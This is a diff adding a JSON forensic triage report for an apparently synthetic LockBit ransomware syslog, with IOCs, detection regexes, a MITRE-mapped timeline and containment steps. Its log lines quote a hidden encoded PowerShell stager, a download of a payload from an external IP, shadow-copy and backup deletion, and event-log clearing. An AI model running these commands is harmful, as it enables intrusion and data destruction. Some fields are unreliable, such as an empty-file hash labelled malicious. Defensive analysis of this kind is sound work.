@@ -1,0 +1,809 @@
+{
+    "metadata": {
+        "original_filename": "ransomware_incident_syslog.log",
+        "stored_filename": "ransomware_incident_syslog.log",
+        "file_path": "C:\\Users\\GAURAV\\.gemini\\antigravity\\scratch\\Cyber-Triage-Tool-Advanced\\sample_evidence\\ransomware_incident_syslog.log",
+        "file_size": 2646,
+        "file_type": "LOG",
+        "md5": "615a5d1766f6695f2b4947584cf2a4f0",
+        "sha1": "047f58cede63b2291d578b47e79d08eb51de5452",
+        "sha256": "dd0be9cf2a87b54bed5cfee78b9f9dede56aa0b2419c69116f69fb1052a2f57d",
+        "created_time": "2026-08-18 00:02:14",
+        "modified_time": "2026-08-18 00:02:14"
+    },
+    "risk_score": 100,
+    "risk_level": "Critical",
+    "summary": "Automated digital forensic triage of 'ransomware_incident_syslog.log' identified a CRITICAL risk rating (Score: 100/100). The primary threat vector is classified as 'Ransomware / Extortion' (44.0% confidence). Cyber Kill Chain stage reached: 'Critical Stage - Active Threat Impact / Ransomware Execution' (100.0%). Identified 6 IOCs, 3 signature hits, and 5 MITRE techniques. AI Isolation Forest Anomaly marked status as 'Anomalous'.",
+    "total_iocs": 6,
+    "total_findings": 11,
+    "iocs": {
+        "ips": [
+            {
+                "value": "185.220.101.5",
+                "defanged": "185[.]220[.]101[.]5",
+                "category": "Public / External",
+                "reputation": "Suspicious (External)",
+                "threat_intel": {
+                    "reputation": "Malicious C2 / TOR Exit Node",
+                    "threat_actor": "LockBit 3.0 / APT29",
+                    "country": "RU",
+                    "confidence": 95,
+                    "is_known_threat": true,
+                    "threat_level": "Critical"
+                }
+            },
+            {
+                "value": "194.26.29.112",
+                "defanged": "194[.]26[.]29[.]112",
+                "category": "Public / External",
+                "reputation": "Suspicious (External)",
+                "threat_intel": {
+                    "reputation": "Active Ransomware C2 Gateway",
+                    "threat_actor": "LockBit Affiliate",
+                    "country": "BG",
+                    "confidence": 90,
+                    "is_known_threat": true,
+                    "threat_level": "Critical"
+                }
+            }
+        ],
+        "public_ip_count": 2,
+        "urls": [
+            {
+                "value": "http://185.220.101.5/payload/stage2.exe",
+                "defanged": "hxxp://185[.]220[.]101[.]5/payload/stage2[.]exe",
+                "protocol": "HTTP"
+            }
+        ],
+        "domains": [],
+        "hashes": [
+            {
+                "type": "SHA-256",
+                "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                "threat_intel": {
+                    "is_malicious": true,
+                    "threat_name": "LockBit Dropper Binary",
+                    "category": "Trojan/Dropper",
+                    "severity": "Critical"
+                }
+            },
+            {
+                "type": "MD5",
+                "value": "7b2c9a6234b071e62a8291a13426e95c",
+                "threat_intel": {
+                    "is_malicious": true,
+                    "threat_name": "LockBit 3.0 Encryptor Payload",
+                    "category": "Ransomware",
+                    "severity": "Critical"
+                }
+            }
+        ],
+        "emails": [],
+        "cves": [],
+        "crypto_wallets": [
+            "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+        ],
+        "registry_keys": [],
+        "lolbas_commands": [
+            {
+                "command": "powershell.exe -nop -w hidden -enc",
+                "pattern": "powershell(?:\\.exe)?\\s+.*-(?:enc|encodedcommand|w\\s+hidden|nop|noni|exec\\s+bypass)",
+                "severity": "High"
+            },
+            {
+                "command": "vssadmin.exe delete shadows",
+                "pattern": "vssadmin(?:\\.exe)?\\s+delete\\s+shadows",
+                "severity": "Critical"
+            },
+            {
+                "command": "wmic shadowcopy delete",
+                "pattern": "wmic(?:\\.exe)?\\s+shadowcopy\\s+delete",
+                "severity": "High"
+            },
+            {
+                "command": "wbadmin.exe delete catalog",
+                "pattern": "wbadmin(?:\\.exe)?\\s+delete\\s+catalog",
+                "severity": "High"
+            },
+            {
+                "command": "bcdedit.exe /set {default} recoveryenabled no",
+                "pattern": "bcdedit(?:\\.exe)?\\s+/set\\s+.*recoveryenabled\\s+no",
+                "severity": "High"
+            },
+            {
+                "command": "WebClient",
+                "pattern": "downloadstring|downloadfile|webclient",
+                "severity": "High"
+            },
+            {
+                "command": "DownloadFile",
+                "pattern": "downloadstring|downloadfile|webclient",
+                "severity": "High"
+            }
+        ],
+        "suspicious_keywords": [
+            {
+                "keyword": "payload",
+                "occurrences": 4
+            },
+            {
+                "keyword": "lockbit",
+                "occurrences": 6
+            }
+        ],
+        "base64_payloads": [
+            {
+                "encoded": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca4...",
+                "decoded": "{vs6x\u007f<\u079fo\u0778\u06f6W[~\u001cky[voy"
+            }
+        ],
+        "total_iocs_count": 6
+    },
+    "threat_intel_hits": [
+        "Known Malicious IP: 185.220.101.5 (LockBit 3.0 / APT29)",
+        "Known Malicious IP: 194.26.29.112 (LockBit Affiliate)",
+        "Known Threat Hash: e3b0c44298fc1c14... (LockBit Dropper Binary)",
+        "Known Threat Hash: 7b2c9a6234b071e6... (LockBit 3.0 Encryptor Payload)"
+    ],
+    "yara_matches": [
+        {
+            "rule_id": "RULE-RANSOM-001",
+            "rule_name": "Ransomware Shadow Copy & Backup Invalidation",
+            "category": "Ransomware",
+            "severity": "Critical",
+            "score_contribution": 35,
+            "description": "Attempts to inhibit system recovery by deleting volume shadow copies or disabling startup repair.",
+            "mitre_id": "T1490",
+            "mitre_name": "Inhibit System Recovery",
+            "hits_count": 4,
+            "sample_hits": [
+                {
+                    "matched_string": "vssadmin.exe delete shadows /all /quiet",
+                    "start_pos": 1302,
+                    "end_pos": 1341
+                },
+                {
+                    "matched_string": "wmic shadowcopy delete",
+                    "start_pos": 1509,
+                    "end_pos": 1531
+                },
+                {
+                    "matched_string": "bcdedit.exe /set {default} recoveryenabled no",
+                    "start_pos": 1702,
+                    "end_pos": 1747
+                },
+                {
+                    "matched_string": "wbadmin.exe delete catalog",
+                    "start_pos": 1918,
+                    "end_pos": 1944
+                }
+            ]
+        },
+        {
+            "rule_id": "RULE-RANSOM-002",
+            "rule_name": "Ransomware Note & Known Extortion Signatures",
+            "category": "Ransomware",
+            "severity": "Critical",
+            "score_contribution": 35,
+            "description": "Indicators of ransom notes, encryption extensions, or extortion group signatures (e.g. LockBit, Conti).",
+            "mitre_id": "T1486",
+            "mitre_name": "Data Encrypted for Impact",
+            "hits_count": 7,
+            "sample_hits": [
+                {
+                    "matched_string": "All your files have been encrypted",
+                    "start_pos": 2083,
+                    "end_pos": 2117
+                },
+                {
+                    "matched_string": "lockbit",
+                    "start_pos": 859,
+                    "end_pos": 866
+                },
+                {
+                    "matched_string": "lockbit",
+                    "start_pos": 992,
+                    "end_pos": 999
+                },
+                {
+                    "matched_string": "LOCKBIT",
+                    "start_pos": 2053,
+                    "end_pos": 2060
+                },
+                {
+                    "matched_string": "LockBit",
+                    "start_pos": 2121,
+                    "end_pos": 2128
+                }
+            ]
+        },
+        {
+            "rule_id": "RULE-EVASION-001",
+            "rule_name": "Defense Evasion & Security Log Tampering",
+            "category": "Defense Evasion",
+            "severity": "High",
+            "score_contribution": 25,
+            "description": "Attempts to clear event logs, disable antivirus, or bypass execution policies.",
+            "mitre_id": "T1070.001",
+            "mitre_name": "Indicator Removal: Clear Windows Event Logs",
+            "hits_count": 1,
+            "sample_hits": [
+                {
+                    "matched_string": "wevtutil.exe cl Security",
+                    "start_pos": 2621,
+                    "end_pos": 2645
+                }
+            ]
+        }
+    ],
+    "binary_info": {
+        "entropy": 5.5403,
+        "entropy_status": "Normal (Uncompressed)",
+        "is_pe_executable": false,
+        "is_packed": false,
+        "packers_detected": [],
+        "suspicious_apis_found": [],
+        "api_threat_level": "Low"
+    },
+    "timeline": [
+        {
+            "id": 1,
+            "timestamp": "2026-08-17 02:14:22",
+            "category": "System Event",
+            "severity": "Info",
+            "description": "Aug 17 02:14:22 DC01-SRV Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Account Name: Admin_Backup, Logon Type: 10 (RemoteInteractive), Source Network Address: 185.220.101.5",
+            "raw_snippet": "Aug 17 02:14:22 DC01-SRV Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Account Name: Admin_Backup, Logon Type: 10 (RemoteInteractive), Source Network Address: 185.220.101.5"
+        },
+        {
+            "id": 2,
+            "timestamp": "2026-08-17 02:14:45",
+            "category": "Suspicious Execution / LOLBAS",
+            "severity": "High",
+            "description": "Aug 17 02:14:45 DC01-SRV Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMA...",
+            "raw_snippet": "Aug 17 02:14:45 DC01-SRV Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4A"
+        },
+        {
+            "id": 3,
+            "timestamp": "2026-08-17 02:15:10",
+            "category": "Ransomware / Critical Threat",
+            "severity": "Critical",
+            "description": "Aug 17 02:15:10 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1059.001, ProcessId: 4892, Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, CommandLine: powershell.exe -Comm...",
+            "raw_snippet": "Aug 17 02:15:10 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1059.001, ProcessId: 4892, Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, CommandLine: powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://185.220.101.5/payload/stage"
+        },
+        {
+            "id": 4,
+            "timestamp": "2026-08-17 02:15:33",
+            "category": "Ransomware / Critical Threat",
+            "severity": "Critical",
+            "description": "Aug 17 02:15:33 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: ProcessId: 5120, Image: C:\\Users\\Public\\lockbit_payload.exe, Hashes: MD5=7b2c9a6234b071e62a8291a13426e95c, SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae...",
+            "raw_snippet": "Aug 17 02:15:33 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: ProcessId: 5120, Image: C:\\Users\\Public\\lockbit_payload.exe, Hashes: MD5=7b2c9a6234b071e62a8291a13426e95c, SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        },
+        {
+            "id": 5,
+            "timestamp": "2026-08-17 02:16:01",
+            "category": "Ransomware / Critical Threat",
+            "severity": "Critical",
+            "description": "Aug 17 02:16:01 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5244, Image: C:\\Windows\\System32\\vssadmin.exe, CommandLine: vssadmin.exe delete shadows /all /quiet",
+            "raw_snippet": "Aug 17 02:16:01 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5244, Image: C:\\Windows\\System32\\vssadmin.exe, CommandLine: vssadmin.exe delete shadows /all /quiet"
+        },
+        {
+            "id": 6,
+            "timestamp": "2026-08-17 02:16:08",
+            "category": "System Event",
+            "severity": "Info",
+            "description": "Aug 17 02:16:08 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5280, Image: C:\\Windows\\System32\\wmic.exe, CommandLine: wmic shadowcopy delete",
+            "raw_snippet": "Aug 17 02:16:08 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5280, Image: C:\\Windows\\System32\\wmic.exe, CommandLine: wmic shadowcopy delete"
+        },
+        {
+            "id": 7,
+            "timestamp": "2026-08-17 02:16:15",
+            "category": "System Event",
+            "severity": "Info",
+            "description": "Aug 17 02:16:15 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5312, Image: C:\\Windows\\System32\\bcdedit.exe, CommandLine: bcdedit.exe /set {default} recoveryenabled no",
+            "raw_snippet": "Aug 17 02:16:15 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5312, Image: C:\\Windows\\System32\\bcdedit.exe, CommandLine: bcdedit.exe /set {default} recoveryenabled no"
+        },
+        {
+            "id": 8,
+            "timestamp": "2026-08-17 02:16:22",
+            "category": "System Event",
+            "severity": "Info",
+            "description": "Aug 17 02:16:22 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5344, Image: C:\\Windows\\System32\\wbadmin.exe, CommandLine: wbadmin.exe delete catalog -quiet",
+            "raw_snippet": "Aug 17 02:16:22 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5344, Image: C:\\Windows\\System32\\wbadmin.exe, CommandLine: wbadmin.exe delete catalog -quiet"
+        },
+        {
+            "id": 9,
+            "timestamp": "2026-08-17 02:17:40",
+            "category": "Ransomware / Critical Threat",
+            "severity": "Critical",
+            "description": "Aug 17 02:17:40 DC01-SRV Microsoft-Windows-Sysmon[11]: FileCreate: TargetFilename: C:\\Shares\\Finance\\LOCKBIT_README.txt, Contents: All your files have been encrypted by LockBit 3.0. Contact us at lockbit77xxy.onion or se...",
+            "raw_snippet": "Aug 17 02:17:40 DC01-SRV Microsoft-Windows-Sysmon[11]: FileCreate: TargetFilename: C:\\Shares\\Finance\\LOCKBIT_README.txt, Contents: All your files have been encrypted by LockBit 3.0. Contact us at lockbit77xxy.onion or send bitcoin to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+        },
+        {
+            "id": 10,
+            "timestamp": "2026-08-17 02:18:10",
+            "category": "Ransomware / Critical Threat",
+            "severity": "Critical",
+            "description": "Aug 17 02:18:10 DC01-SRV Microsoft-Windows-Sysmon[3]: Network connection detected: RuleName: technique_id=T1071.001, ProcessId: 5120, Image: C:\\Users\\Public\\lockbit_payload.exe, DestinationIp: 194.26.29.112, DestinationP...",
+            "raw_snippet": "Aug 17 02:18:10 DC01-SRV Microsoft-Windows-Sysmon[3]: Network connection detected: RuleName: technique_id=T1071.001, ProcessId: 5120, Image: C:\\Users\\Public\\lockbit_payload.exe, DestinationIp: 194.26.29.112, DestinationPort: 8443, Protocol: tcp"
+        },
+        {
+            "id": 11,
+            "timestamp": "2026-08-17 02:19:00",
+            "category": "System Event",
+            "severity": "Info",
+            "description": "Aug 17 02:19:00 DC01-SRV Microsoft-Windows-Security-Auditing[1102]: The audit log was cleared. Subject: Admin_Backup, Process: C:\\Windows\\System32\\wevtutil.exe cl Security",
+            "raw_snippet": "Aug 17 02:19:00 DC01-SRV Microsoft-Windows-Security-Auditing[1102]: The audit log was cleared. Subject: Admin_Backup, Process: C:\\Windows\\System32\\wevtutil.exe cl Security"
+        }
+    ],
+    "mitre_mapping": [
+        {
+            "technique_id": "T1490",
+            "technique_name": "Inhibit System Recovery",
+            "tactic_id": "TA0040",
+            "tactic_name": "Impact",
+            "color": "#dc2626",
+            "description": "Adversaries may delete or disable system recovery features to make remediation harder during ransomware execution.",
+            "evidence_trigger": "vssadmin"
+        },
+        {
+            "technique_id": "T1486",
+            "technique_name": "Data Encrypted for Impact",
+            "tactic_id": "TA0040",
+            "tactic_name": "Impact",
+            "color": "#dc2626",
+            "description": "Adversaries encrypt data on target systems to interrupt availability and demand ransom payments.",
+            "evidence_trigger": "lockbit"
+        },
+        {
+            "technique_id": "T1059.001",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "tactic_id": "TA0002",
+            "tactic_name": "Execution",
+            "color": "#8b5cf6",
+            "description": "Adversaries abuse PowerShell commands and scripts to execute malicious code and stagers.",
+            "evidence_trigger": "powershell"
+        },
+        {
+            "technique_id": "T1190",
+            "technique_name": "Exploit Public-Facing Application",
+            "tactic_id": "TA0001",
+            "tactic_name": "Initial Access",
+            "color": "#3b82f6",
+            "description": "Adversaries exploit weaknesses or vulnerabilities in Internet-facing programs to gain initial network access.",
+            "evidence_trigger": "rce"
+        },
+        {
+            "technique_id": "T1070.001",
+            "technique_name": "Indicator Removal: Clear Windows Event Logs",
+            "tactic_id": "TA0005",
+            "tactic_name": "Defense Evasion",
+            "color": "#eab308",
+            "description": "Adversaries clear security and system event logs to evade detection and hinder forensic analysis.",
+            "evidence_trigger": "wevtutil"
+        }
+    ],
+    "mitre_summary": {
+        "Impact": 2,
+        "Execution": 1,
+        "Initial Access": 1,
+        "Defense Evasion": 1
+    },
+    "kill_chain": {
+        "progression_percentage": 100.0,
+        "highest_stage_reached": 6,
+        "kill_chain_status": "Critical Stage - Active Threat Impact / Ransomware Execution",
+        "stages": [
+            {
+                "stage_id": 1,
+                "name": "1. Initial Access & Delivery",
+                "description": "Adversary achieves initial foothold through phishing, exploit public application, or external authentication.",
+                "color": "#3b82f6",
+                "is_active": true,
+                "detected_triggers": [
+                    "rce"
+                ]
+            },
+            {
+                "stage_id": 2,
+                "name": "2. Execution & Staging",
+                "description": "Execution of malicious scripts, obfuscated PowerShell, or secondary droppers.",
+                "color": "#8b5cf6",
+                "is_active": true,
+                "detected_triggers": [
+                    "powershell",
+                    "-enc",
+                    "downloadfile",
+                    "wmic"
+                ]
+            },
+            {
+                "stage_id": 3,
+                "name": "3. Persistence & Privilege Escalation",
+                "description": "Establishing persistent autostart registry keys, scheduled tasks, or acquiring administrator tokens.",
+                "color": "#f97316",
+                "is_active": false,
+                "detected_triggers": []
+            },
+            {
+                "stage_id": 4,
+                "name": "4. Credential Access & Discovery",
+                "description": "Dumping memory credentials, LSASS tampering, SAM extraction, or network enumeration.",
+                "color": "#ef4444",
+                "is_active": false,
+                "detected_triggers": []
+            },
+            {
+                "stage_id": 5,
+                "name": "5. Command & Control (C2)",
+                "description": "Maintaining outbound communication channels, beaconing, or DNS tunnels to remote servers.",
+                "color": "#d946ef",
+                "is_active": false,
+                "detected_triggers": []
+            },
+            {
+                "stage_id": 6,
+                "name": "6. Impact & Extortion",
+                "description": "System inhibition, volume shadow copy deletion, mass file encryption, and ransom extortion.",
+                "color": "#dc2626",
+                "is_active": true,
+                "detected_triggers": [
+                    "vssadmin",
+                    "delete shadows",
+                    "encrypt",
+                    "lockbit"
+                ]
+            }
+        ]
+    },
+    "evtx_results": {
+        "events": [],
+        "total_parsed_events": 0,
+        "failed_logon_count": 0,
+        "cleared_logs_count": 0,
+        "privileged_logons": [],
+        "flagged_anomalies": []
+    },
+    "network_results": {
+        "flows_count": 0,
+        "dns_queries": [],
+        "suspicious_ports": [
+            {
+                "port": 8443,
+                "description": "HTTPS Alternate C2 Gateway"
+            }
+        ],
+        "flagged_threats": [
+            {
+                "type": "Suspicious C2 / Backdoor Port",
+                "severity": "High",
+                "indicator": "Port 8443",
+                "description": "Network traffic destined for known backdoor/C2 port 8443 (HTTPS Alternate C2 Gateway)."
+            }
+        ]
+    },
+    "registry_results": {
+        "persistence_keys": [],
+        "suspicious_services": [],
+        "userassist_entries": [],
+        "usbstor_devices": []
+    },
+    "browser_results": {
+        "dangerous_downloads": [
+            {
+                "file": "powershell.exe",
+                "extension": ".exe",
+                "line": 2,
+                "severity": "High"
+            },
+            {
+                "file": "powershell.exe",
+                "extension": ".exe",
+                "line": 3,
+                "severity": "High"
+            },
+            {
+                "file": "lockbit_payload.exe",
+                "extension": ".exe",
+                "line": 4,
+                "severity": "High"
+            },
+            {
+                "file": "vssadmin.exe",
+                "extension": ".exe",
+                "line": 5,
+                "severity": "High"
+            },
+            {
+                "file": "wmic.exe",
+                "extension": ".exe",
+                "line": 6,
+                "severity": "High"
+            },
+            {
+                "file": "bcdedit.exe",
+                "extension": ".exe",
+                "line": 7,
+                "severity": "High"
+            },
+            {
+                "file": "wbadmin.exe",
+                "extension": ".exe",
+                "line": 8,
+                "severity": "High"
+            },
+            {
+                "file": "lockbit_payload.exe",
+                "extension": ".exe",
+                "line": 10,
+                "severity": "High"
+            },
+            {
+                "file": "wevtutil.exe",
+                "extension": ".exe",
+                "line": 11,
+                "severity": "High"
+            }
+        ],
+        "phishing_indicators": [],
+        "web_attacks": []
+    },
+    "ml_anomaly": {
+        "is_anomaly": true,
+        "status": "Anomalous",
+        "anomaly_score": 56.01,
+        "raw_decision_score": -0.0501,
+        "confidence": "Medium Confidence Anomaly",
+        "evaluated_features": {
+            "Total IOCs": 6,
+            "Public IPs": 2,
+            "YARA Signature Hits": 3,
+            "LOLBAS / Obfuscated Commands": 7,
+            "Threat Keywords": 2,
+            "MITRE ATT&CK Techniques": 5
+        }
+    },
+    "supervised_threat": {
+        "predicted_threat": "Ransomware / Extortion",
+        "confidence_pct": 44.0,
+        "probability_breakdown": {
+            "Benign / Normal Activity": 7.0,
+            "Ransomware / Extortion": 44.0,
+            "APT & C2 Communication": 10.0,
+            "Credential Theft & Access": 17.0,
+            "Web Application Compromise": 22.0
+        },
+        "top_features": [
+            {
+                "feature": "Entropy",
+                "importance": 21.2
+            },
+            {
+                "feature": "Public IPs",
+                "importance": 14.7
+            },
+            {
+                "feature": "LOLBAS Commands",
+                "importance": 13.4
+            },
+            {
+                "feature": "Total IOCs",
+                "importance": 11.9
+            }
+        ]
+    },
+    "threat_classification": {
+        "primary_vector": "Ransomware / Extortion",
+        "confidence_pct": 86.7,
+        "narrative": "Critical threat indicators show active ransomware staging, shadow copy deletion, or data encryption extortion artifacts.",
+        "vector_breakdown": {
+            "Ransomware / Extortion": 86.7,
+            "APT & C2 Communication": 3.3,
+            "Credential Theft & Access": 0.0,
+            "Web Application Compromise": 0.0,
+            "Persistence & Defense Evasion": 8.3,
+            "Benign / Baseline Activity": 1.7
+        }
+    },
+    "recommendations": {
+        "priority_level": "P1 - Immediate Action Required",
+        "threat_summary": "Based on risk score (100/100) and detected Ransomware / Extortion, the AI recommendation engine suggests the following containment and forensic steps:",
+        "containment_actions": [
+            {
+                "phase": "Network Containment",
+                "action": "Block 2 malicious external IP(s) on perimeter firewall and EDR.",
+                "targets": [
+                    "185.220.101.5",
+                    "194.26.29.112"
+                ],
+                "urgency": "High"
+            },
+            {
+                "phase": "Endpoint Isolation",
+                "action": "Immediately disconnect host from corporate LAN and Wi-Fi to prevent lateral encryption spreading.",
+                "urgency": "Immediate"
+            },
+            {
+                "phase": "Backup Verification",
+                "action": "Check offline immutable backups and verify integrity of VSS shadow copies on unaffected systems.",
+                "urgency": "Immediate"
+            },
+            {
+                "phase": "Persistence Removal",
+                "action": "Audit and remove unauthorized Windows Registry Run keys, Scheduled Tasks, and anomalous startup services.",
+                "urgency": "Medium"
+            }
+        ],
+        "investigation_checklist": [
+            "Inspect Master File Table ($MFT) and USN Journal for mass file renaming activity.",
+            "Identify initial access vector (Phishing email, RDP brute force, or unpatched VPN/firewall).",
+            "Inspect AutoRuns / WMI event subscriptions for disguised binaries.",
+            "Preserve full volatile memory dump (.raw/.dmp) using WinPmem or FTK Imager prior to power down.",
+            "Generate and record SHA-256 cryptographic hashes for all acquired disk artifacts.",
+            "Submit extracted malicious file hashes to internal Threat Intelligence (MISP / VirusTotal)."
+        ],
+        "containment_scripts": [
+            {
+                "title": "PowerShell Firewall Block Script",
+                "code": "# Block Malicious C2 IPs\n$MaliciousIPs = @(\"185.220.101.5\", \"194.26.29.112\")\nforeach ($ip in $MaliciousIPs) {\n    New-NetFirewallRule -DisplayName \"CyberTriage-Block-C2-$ip\" -Direction Outbound -Action Block -RemoteAddress $ip\n}"
+            }
+        ]
+    },
+    "graph_data": {
+        "nodes": [
+            {
+                "id": "evidence_ransomware_incident_syslog.log",
+                "label": "ransomware_incident_syslog.log",
+                "group": "evidence",
+                "size": 24,
+                "color": "#3b82f6"
+            },
+            {
+                "id": "ip_185.220.101.5",
+                "label": "185[.]220[.]101[.]5",
+                "group": "network",
+                "size": 14,
+                "color": "#ef4444"
+            },
+            {
+                "id": "actor_LockBit 3.0 / APT29",
+                "label": "LockBit 3.0 / APT29",
+                "group": "threat_actor",
+                "size": 18,
+                "color": "#dc2626"
+            },
+            {
+                "id": "ip_194.26.29.112",
+                "label": "194[.]26[.]29[.]112",
+                "group": "network",
+                "size": 14,
+                "color": "#ef4444"
+            },
+            {
+                "id": "actor_LockBit Affiliate",
+                "label": "LockBit Affiliate",
+                "group": "threat_actor",
+                "size": 18,
+                "color": "#dc2626"
+            },
+            {
+                "id": "threat_RULE-RANSOM-001",
+                "label": "Ransomware Shadow Copy & ..",
+                "group": "threat",
+                "size": 16,
+                "color": "#dc2626"
+            },
+            {
+                "id": "threat_RULE-RANSOM-002",
+                "label": "Ransomware Note & Known E..",
+                "group": "threat",
+                "size": 16,
+                "color": "#dc2626"
+            },
+            {
+                "id": "threat_RULE-EVASION-001",
+                "label": "Defense Evasion & Securit..",
+                "group": "threat",
+                "size": 16,
+                "color": "#dc2626"
+            },
+            {
+                "id": "mitre_T1490",
+                "label": "T1490: Inhibit System Recov",
+                "group": "mitre",
+                "size": 13,
+                "color": "#dc2626"
+            },
+            {
+                "id": "mitre_T1486",
+                "label": "T1486: Data Encrypted for I",
+                "group": "mitre",
+                "size": 13,
+                "color": "#dc2626"
+            },
+            {
+                "id": "mitre_T1059.001",
+                "label": "T1059.001: Command and Scriptin",
+                "group": "mitre",
+                "size": 13,
+                "color": "#8b5cf6"
+            },
+            {
+                "id": "mitre_T1190",
+                "label": "T1190: Exploit Public-Facin",
+                "group": "mitre",
+                "size": 13,
+                "color": "#3b82f6"
+            },
+            {
+                "id": "mitre_T1070.001",
+                "label": "T1070.001: Indicator Removal: C",
+                "group": "mitre",
+                "size": 13,
+                "color": "#eab308"
+            }
+        ],
+        "links": [
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "ip_185.220.101.5",
+                "relation": "Communicates with"
+            },
+            {
+                "source": "ip_185.220.101.5",
+                "target": "actor_LockBit 3.0 / APT29",
+                "relation": "Attributed C2"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "ip_194.26.29.112",
+                "relation": "Communicates with"
+            },
+            {
+                "source": "ip_194.26.29.112",
+                "target": "actor_LockBit Affiliate",
+                "relation": "Attributed C2"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "threat_RULE-RANSOM-001",
+                "relation": "Matches signature"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "threat_RULE-RANSOM-002",
+                "relation": "Matches signature"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "threat_RULE-EVASION-001",
+                "relation": "Matches signature"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "mitre_T1490",
+                "relation": "Tactic: Impact"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "mitre_T1486",
+                "relation": "Tactic: Impact"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "mitre_T1059.001",
+                "relation": "Tactic: Execution"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "mitre_T1190",
+                "relation": "Tactic: Initial Access"
+            },
+            {
+                "source": "evidence_ransomware_incident_syslog.log",
+                "target": "mitre_T1070.001",
+                "relation": "Tactic: Defense Evasion"
+            }
+        ]
+    },
+    "raw_preview": "Aug 17 02:14:22 DC01-SRV Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Account Name: Admin_Backup, Logon Type: 10 (RemoteInteractive), Source Network Address: 185.220.101.5\nAug 17 02:14:45 DC01-SRV Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAiACwANAA0ADQANAApAA==\nAug 17 02:15:10 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1059.001, ProcessId: 4892, Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, CommandLine: powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://185.220.101.5/payload/stage2.exe', 'C:\\Users\\Public\\lockbit_payload.exe')\"\nAug 17 02:15:33 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: ProcessId: 5120, Image: C:\\Users\\Public\\lockbit_payload.exe, Hashes: MD5=7b2c9a6234b071e62a8291a13426e95c, SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nAug 17 02:16:01 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5244, Image: C:\\Windows\\System32\\vssadmin.exe, CommandLine: vssadmin.exe delete shadows /all /quiet\nAug 17 02:16:08 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5280, Image: C:\\Windows\\System32\\wmic.exe, CommandLine: wmic shadowcopy delete\nAug 17 02:16:15 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5312, Image: C:\\Windows\\System32\\bcdedit.exe, CommandLine: bcdedit.exe /set {default} recoveryenabled no\nAug 17 02:16:22 DC01-SRV Microsoft-Windows-Sysmon[1]: Process Create: RuleName: technique_id=T1490, ProcessId: 5344, Image: C:\\Windows\\System32\\wbadmin.exe, CommandLine: wbadmin.exe delete 